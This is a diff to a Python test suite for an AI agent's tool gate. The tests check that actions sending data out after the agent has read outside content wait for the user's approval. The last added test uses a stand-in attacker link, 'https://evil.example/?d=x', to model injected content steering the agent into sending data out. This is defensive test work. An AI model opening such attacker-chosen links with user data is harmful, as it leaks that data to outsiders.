@@ -104,6 +104,43 @@ class Picky(Echo):
         raise ToolError("No app called Sfari.")
 
 
+class Link(Echo):
+    """Opens an address: harmless, unless outside content chose what it carries."""
+
+    name = "link"
+    tier = Tier.REVERSIBLE
+
+    def sends_data_out(self, args: TextArgs) -> bool:
+        return True
+
+
+class Lookup(Send):
+    """Resolves a name to an address before asking, like ``mail_send``."""
+
+    name = "lookup"
+    book: ClassVar[dict[str, str]] = {"thomas": "Thomas Peeters <thomas@example.com>"}
+
+    async def prepare(self, args: SendArgs) -> SendArgs:
+        if args.to == "slow":
+            await asyncio.sleep(60)
+        if args.to == "broken":
+            raise ZeroDivisionError
+        if args.to.casefold() not in self.book:
+            raise ToolError(f"No contact called {args.to!r}.")
+        return SendArgs(to=self.book[args.to.casefold()], text=args.text)
+
+
+class Patient(Slow):
+    """Allowed to take longer than the toolbox's default."""
+
+    name = "patient"
+    timeout_s = 120.0
+
+    async def run(self, args: TextArgs) -> str:
+        await asyncio.sleep(0.05)
+        return "worth the wait"
+
+
 def call(name: str, call_id: str = "1", **arguments: Any) -> ToolCall:
     return ToolCall(call_id, name, arguments)
 
@@ -116,7 +153,8 @@ def clear_sent() -> None:
 def toolbox(
     *, confirm_external: bool = True, activity: list[str] | None = None, timeout_s: float = 10
 ) -> Toolbox:
-    tools = [Echo(), Send(), Wipe(), Browse(), Slow(), Broken(), Picky()]
+    tools = [Echo(), Send(), Wipe(), Browse(), Slow(), Broken(), Picky(), Link(), Lookup()]
+    tools.append(Patient())
     return Toolbox(
         tools,
         Gate(confirm_external=confirm_external),
@@ -146,6 +184,15 @@ def toolbox(
 def test_gate(tool: Tool[Any], tainted: bool, confirm_external: bool, expected: Verdict) -> None:
     gate = Gate(confirm_external=confirm_external)
     assert gate.check(tool, tainted=tainted).verdict is expected
+
+
+@pytest.mark.parametrize(("tainted", "expected"), [(False, Verdict.ALLOW), (True, Verdict.CONFIRM)])
+def test_sending_data_out_after_outside_content_needs_a_yes(
+    tainted: bool, expected: Verdict
+) -> None:
+    gate = Gate(confirm_external=False)
+    assert gate.check(Link(), tainted=tainted, sends_out=True).verdict is expected
+    assert gate.check(Link(), tainted=tainted, sends_out=False).verdict is Verdict.ALLOW
 
 
 def test_dangerous_tools_stay_refused_even_when_allowed() -> None:
@@ -187,6 +234,50 @@ async def test_bad_calls_become_errors_for_the_model(bad: ToolCall, message: str
 async def test_slow_tools_are_stopped() -> None:
     (result,) = (await toolbox(timeout_s=0.01).run([call("slow", text="x")], tainted=False)).results
     assert result.is_error and "too long" in result.content
+
+
+async def test_tools_can_ask_for_more_time() -> None:
+    box = toolbox(timeout_s=0.01)
+    (result,) = (await box.run([call("patient", text="x")], tainted=False)).results
+    assert result.content == "worth the wait"
+
+
+async def test_what_is_confirmed_is_what_was_resolved() -> None:
+    """The question names the resolved address, and the "yes" runs exactly that."""
+    box = toolbox()
+    outcome = await box.run([call("lookup", to="Thomas", text="hi")], tainted=False)
+    assert outcome.pending is not None
+    assert outcome.pending.question == "Should I send 'hi' to Thomas Peeters <thomas@example.com>?"
+    await box.confirm(outcome.pending)
+    assert Send.sent == [("Thomas Peeters <thomas@example.com>", "hi")]
+
+
+@pytest.mark.parametrize(
+    ("to", "message"),
+    [
+        ("Nobody", "No contact called 'Nobody'."),
+        ("broken", "It failed unexpectedly."),
+        ("slow", "It took too long and was stopped."),
+    ],
+)
+async def test_resolving_can_fail(to: str, message: str) -> None:
+    box = toolbox(timeout_s=0.01)
+    outcome = await box.run([call("lookup", to=to, text="hi")], tainted=False)
+    assert outcome.pending is None
+    assert outcome.results[0].is_error
+    assert outcome.results[0].content.endswith(message)
+
+
+async def test_an_address_chosen_after_reading_outside_content_is_asked_about() -> None:
+    box = toolbox(confirm_external=False)
+    calm = await box.run([call("link", text="https://example.com")], tainted=False)
+    assert calm.pending is None and calm.done == ("echo 'https://example.com'",)
+    steered = await box.run(
+        [call("browse", "1", text="x"), call("link", "2", text="https://evil.example/?d=x")],
+        tainted=False,
+    )
+    assert steered.pending is not None
+    assert steered.results[1].content == WAITING_FOR_USER
 
 
 async def test_external_actions_wait_for_the_user() -> None:
